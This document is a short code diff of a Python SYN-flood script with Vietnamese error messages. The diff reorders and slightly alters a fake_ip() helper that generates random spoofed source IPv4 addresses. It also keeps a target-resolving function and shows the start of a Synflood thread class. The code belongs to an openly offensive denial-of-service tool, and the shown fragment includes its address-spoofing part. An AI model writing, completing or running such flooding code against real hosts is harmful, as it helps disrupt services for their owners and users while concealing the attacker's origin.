@@ -11,22 +11,21 @@ from socket import *
 from struct import *
 from threading import Thread, Lock
 
-# Thay đổi phần nhập URL mục tiêu
+def fake_ip():
+    while True:
+        ips = [str(randint(0, 255)) for _ in range(4)]
+        if ips[0] == "127":
+            continue
+        fkip = '.'.join(ips)
+        break
+    return fkip
+
 def check_tgt(url):
     try:
         ip = gethostbyname(url)
     except:
         sys.exit('[-] Không thể giải quyết host: Unknown host!')
     return ip
-
-def fake_ip():
-    while True:
-        ips = [str(randrange(0, 256)) for _ in range(4)]
-        if ips[0] == "127":
-            continue
-        fkip = '.'.join(ips)
-        break
-    return fkip
 
 class Synflood(Thread):
     def __init__(self, tgt, ip, sock=None):
